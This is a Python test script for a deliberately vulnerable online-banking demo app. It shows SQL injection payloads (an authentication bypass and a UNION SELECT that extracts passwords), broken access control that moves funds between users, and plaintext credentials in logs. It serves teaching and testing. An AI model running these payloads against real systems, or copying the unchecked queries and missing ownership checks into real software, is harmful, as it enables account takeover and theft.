"""
test_vulnerabilities.py - Automated tests that DEMONSTRATE all 3 vulnerabilities.

Run with:
    cd online_banking
    python3 -m testcases.test_vulnerabilities

Each test prints a PASS/FAIL verdict.
"""

import sys
import os

# Ensure online_banking/ is on the path
sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from src.db import init_db, vulnerable_login, vulnerable_search_user, get_user_by_id, DB_PATH
from src.auth import login
from src.banking import check_balance, transfer_funds, transaction_history
from src.beneficiary import list_beneficiaries
from src.session import create_session

# ---------------------------------------------------------------------------
# Setup
# ---------------------------------------------------------------------------
def setup():
    """Initialise (or re-initialise) the database for testing."""
    # Remove existing DB so tests start clean
    if os.path.exists(DB_PATH):
        os.remove(DB_PATH)
    init_db()
    print("  [setup] Database initialised with seed data.\n")


# ---------------------------------------------------------------------------
# Test 1 — SQL Injection (CWE-89)
# ---------------------------------------------------------------------------
def test_sql_injection_login():
    """
    Demonstrates that the login function is vulnerable to SQL injection.
    By injecting  ' OR '1'='1' --  as the username, the attacker can
    bypass authentication without knowing a valid password.
    """
    print("=" * 60)
    print("TEST 1: SQL Injection on Login (CWE-89)")
    print("=" * 60)

    # Normal login should succeed
    user = vulnerable_login("alice", "password123")
    assert user is not None, "Sanity check — normal login should work"
    print("  [+] Normal login (alice/password123) succeeded — OK")

    # Normal login with wrong password should fail
    user = vulnerable_login("alice", "wrongpassword")
    assert user is None, "Sanity check — wrong password should fail"
    print("  [+] Wrong password login failed — OK")

    # SQL injection bypass
    injected_username = "' OR '1'='1' --"
    injected_password = "anything"
    user = vulnerable_login(injected_username, injected_password)

    if user:
        print(f"  [!] SQL Injection SUCCEEDED — logged in as: {user['username']} (id={user['id']})")
        print(f"      Injected username: {injected_username}")
        print(f"      Injected password: {injected_password}")
        print("  RESULT: *** PASS (vulnerability confirmed) ***")
    else:
        print("  RESULT: FAIL (injection did not work)")
    print()


def test_sql_injection_search():
    """
    Demonstrates SQL injection in the user search function.
    By injecting a UNION SELECT, an attacker can extract data from
    other tables (e.g., passwords).
    """
    print("=" * 60)
    print("TEST 1b: SQL Injection on Search (CWE-89)")
    print("=" * 60)

    # Normal search
    results = vulnerable_search_user("alice")
    print(f"  [+] Normal search for 'alice' returned {len(results)} result(s) — OK")

    # Injection: close the LIKE, UNION SELECT passwords
    injection = "' UNION SELECT id, username, password FROM users --"
    results = vulnerable_search_user(injection)

    if len(results) > 0:
        print(f"  [!] SQL Injection SUCCEEDED — extracted {len(results)} row(s):")
        for r in results:
            print(f"      id={r['id']}, username={r['username']}, full_name/password={r['full_name']}")
        print("  RESULT: *** PASS (vulnerability confirmed) ***")
    else:
        print("  RESULT: FAIL (injection did not work)")
    print()


# ---------------------------------------------------------------------------
# Test 2 — Broken Access Control (CWE-284)
# ---------------------------------------------------------------------------
def test_broken_access_control():
    """
    Demonstrates that a logged-in user (bob, id=2) can:
    1. View alice's balance (id=1)
    2. View alice's transaction history
    3. View alice's beneficiaries
    4. Transfer funds FROM alice's account
    """
    print("=" * 60)
    print("TEST 2: Broken Access Control (CWE-284)")
    print("=" * 60)

    # Login as bob (id=2)
    bob = get_user_by_id(2)
    assert bob is not None, "Bob should exist"
    bob_token = create_session(bob)
    print(f"  [+] Logged in as bob (id=2), token={bob_token}")

    # 2a — View alice's balance
    alice_balance = check_balance(1)   # alice's user_id
    if alice_balance is not None:
        print(f"  [!] Bob accessed Alice's balance: ${alice_balance:,.2f}")
        print("      → Broken Access Control: no ownership check")
    else:
        print("  [-] Could not access Alice's balance (unexpected)")

    # 2b — View alice's transaction history
    alice_history = transaction_history(1)
    print(f"  [!] Bob accessed Alice's transaction history: {len(alice_history)} record(s)")

    # 2c — View alice's beneficiaries
    alice_bens = list_beneficiaries(1)
    print(f"  [!] Bob accessed Alice's beneficiaries: {len(alice_bens)} record(s)")

    # 2d — Transfer FROM alice's account (bob initiates)
    alice_before = check_balance(1)
    result = transfer_funds(
        from_user_id=1,       # alice
        to_user_id=2,         # bob
        amount=100.0,
        logged_in_user_id=2,  # bob is logged in, but transferring FROM alice
    )
    alice_after = check_balance(1)

    if result["status"] == "success":
        print(f"  [!] Bob transferred $100 FROM Alice's account!")
        print(f"      Alice's balance: ${alice_before:,.2f} → ${alice_after:,.2f}")
        print("      → Broken Access Control: from_user_id not validated against session")

    print("  RESULT: *** PASS (vulnerability confirmed) ***")
    print()


# ---------------------------------------------------------------------------
# Test 3 — Sensitive Data Exposure in Logs (CWE-532)
# ---------------------------------------------------------------------------
def test_sensitive_data_in_logs():
    """
    Demonstrates that passwords, session tokens, and account balances
    are written in plaintext to the application log file.
    """
    print("=" * 60)
    print("TEST 3: Sensitive Data Exposure in Logs (CWE-532)")
    print("=" * 60)

    log_path = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "outputs", "app.log")

    # Trigger some log entries by performing a login
    token, user = login("alice", "password123")
    print(f"  [+] Login performed — token={token}")

    # Read the log file
    if not os.path.exists(log_path):
        print(f"  [-] Log file not found at {log_path}")
        print("  RESULT: FAIL")
        return

    with open(log_path, "r") as f:
        log_content = f.read()

    sensitive_items = {
        "password123": "Alice's password",
        "bob@2024": "Bob's password (from seed log)",
        "admin": "Admin's password (from seed log)",
    }

    found = []
    for item, desc in sensitive_items.items():
        if item in log_content:
            found.append((item, desc))
            print(f"  [!] Found in logs: '{item}' ({desc})")

    if found:
        print(f"\n  [!] {len(found)} sensitive item(s) exposed in plaintext in:")
        print(f"      {log_path}")
        print("  RESULT: *** PASS (vulnerability confirmed) ***")
    else:
        print("  RESULT: FAIL (no sensitive data found in logs)")

    # Show a few relevant log lines
    print("\n  --- Sample log lines containing sensitive data ---")
    for line in log_content.split("\n"):
        if any(item in line for item, _ in sensitive_items.items()):
            print(f"  | {line.strip()}")
            if sum(1 for _ in []) > 4:  # limit output
                break
    print()


# ---------------------------------------------------------------------------
# Main
# ---------------------------------------------------------------------------
def main():
    print("\n" + "#" * 60)
    print("#  ONLINE BANKING — VULNERABILITY TEST SUITE")
    print("#  Demonstrates 3 intentional vulnerabilities")
    print("#" * 60 + "\n")

    setup()

    test_sql_injection_login()
    test_sql_injection_search()
    test_broken_access_control()
    test_sensitive_data_in_logs()

    print("=" * 60)
    print("ALL TESTS COMPLETED")
    print("=" * 60)
    print("\nCheck outputs/app.log for full log entries.\n")


if __name__ == "__main__":
    main()
